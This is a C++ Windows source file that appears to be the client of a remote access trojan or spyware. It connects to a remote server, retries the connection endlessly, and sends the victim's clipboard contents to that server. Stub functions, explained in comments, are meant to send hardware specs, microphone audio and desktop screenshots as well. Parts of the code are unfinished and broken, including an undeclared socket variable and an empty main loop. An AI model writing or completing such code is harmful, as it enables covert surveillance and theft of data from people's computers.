#include "packet.h"
#include "network.h"
#include "common.h"

#pragma comment(lib,"Ws2_32.lib")

wsaWrapper::wsaWrapper() {
    res = WSAStartup(MAKEWORD(2, 2), &wsa);
    if (res != 0) {
        printf("WSAStartup failed: %d\n", res);
    }
}

wsaWrapper::~wsaWrapper()
{
       WSACleanup();
}


std::string getIPv4(std::string dns) {

    hostent* remoteHost;
    in_addr addr = {};
    DWORD dwError;
    remoteHost = gethostbyname(dns.c_str());

    if (remoteHost == NULL) {
        dwError = WSAGetLastError();
        if (dwError != 0) {
            if (dwError == WSAHOST_NOT_FOUND) {
                printf("Host not found\n");
               // return 1;
            }
            else if (dwError == WSANO_DATA) {
                printf("No data record found\n");
               // return 1;
            }
            else {
                printf("Function failed with error: %ld\n", dwError);
               // return 1;
            }
        }
    }
    else {
        addr.s_addr = *(u_long*)remoteHost->h_addr_list[0];
        //	printf("\tFirst IP address: %s\n", inet_ntoa(addr));
    }
    return inet_ntoa(addr);
}



namespace network {

    int _connect(std::string dns, short PORT)
    {
        wsaWrapper wsa;
        SOCKET srvSocket = INVALID_SOCKET;
        sockaddr_in srvAddr;
        int ret = 0;
        ZeroMemory(&srvAddr, sizeof(srvAddr));
        std::string ip = getIPv4(dns);

      
            srvSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (srvSocket == SOCKET_ERROR)
            {
                printf("Error creatng socket %d\n", WSAGetLastError());
                return -1;
            }


        reconnecting:
            srvAddr.sin_family = AF_INET;
            srvAddr.sin_port = htons(PORT);
            srvAddr.sin_addr.S_un.S_addr = inet_addr(ip.c_str());      
       

                ret = connect(srvSOCKET, (sockaddr*)&srvAddr, sizeof(srvAddr));
                
                if (ret == SOCKET_ERROR)
                {
                    ip = getIPv4(dns);
                    Sleep(RETRY_TIME); //reconnect in 5seconds see "common.h"
                    goto reconnecting;
                }

                _sendHWSpecs();

               

                while (true) {


                 }

           
      

        
        //initialise wsa, setup client/srv details and CONNECT to IP/PORT
        return 0;
    }


    int _sendClipbord() {
        
        HANDLE hndl;
        int iRet = 0;
        if (OpenClipboard(nullptr))
        {
             hndl = GetClipboardData(CF_TEXT);    
             Packet clipData = makePacket((char*)hndl, Packet::Type::clip_data);
             try
             {
                 send(srvSOCKET, clipData.buffer.get(), clipData.size, 0);
             }
             catch (const std::exception&)
             {
                 //log send errors on debug.log
             }
            
        }


        

        // take clipboard  FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        return 0;
    }

    int _captureMic() {
        //captureMic see audio.h  FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        return 0;
    }
    int _sendScrShot() {
        //take desktop screenshot FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        return 0;
    }

    int _sendHWSpecs() {
        //get HW specs , FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        return 0;
    }

}
